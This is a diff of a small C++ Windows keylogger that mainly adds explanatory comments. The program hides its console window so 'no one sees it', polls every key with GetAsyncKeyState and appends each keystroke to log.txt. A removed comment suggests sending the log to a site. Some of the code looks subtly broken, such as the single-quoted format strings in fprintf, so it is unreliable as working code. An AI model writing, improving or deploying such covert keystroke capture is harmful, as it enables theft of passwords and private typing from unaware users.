@@ -16,8 +16,10 @@ using namespace std;
 
 int Save(int _key, char *file);
 
+// Main file
 int main() {
   
+  // Free the console so no one sees it
   FreeConsole();
   
   char  i;
@@ -25,21 +27,23 @@ int main() {
   while(true) {
     Sleep(10);
     for(i = 8; i <= 255; i++) {
-      // if button is pressed
+      // if a key is pressed
       if (GetAsyncKeyState(i) == -32767) {
-        Save(i, "log.txt"); // you can make it send to a site
+        Save(i, "log.txt");
       }
     }
   }
   return 0;
 }
-
+// The save file that writes the keys to a file
 int Save(int _key, char *file) {
   cout << _key << endl;
   
   FILE *OUTPUT_FILE;
   
   OUTPUT_FILE = fopen(file, "a+");
+   
+  // If a key is the SHIFT key, the BACK key, the RETURN key, or the ESCAPE key, write it as that [KEY]. Else, write the key pressed.
   if (_key == VK_SHIFT)
     fprintf(OUTPUT_FILE, '%s', "[SHIFT]");
   else if(_key == VK_BACK)
@@ -50,7 +54,7 @@ int Save(int _key, char *file) {
     fprintf(OUTPUT_FILE, '%s', "[ESCAPE]");
   else
     fprintf(OUTPUT_FILE, '%s', &_key);
-  fclose(OUTPUT_FILE);
+  fclose(OUTPUT_FILE); // Close the file
   
   return 0;
 }
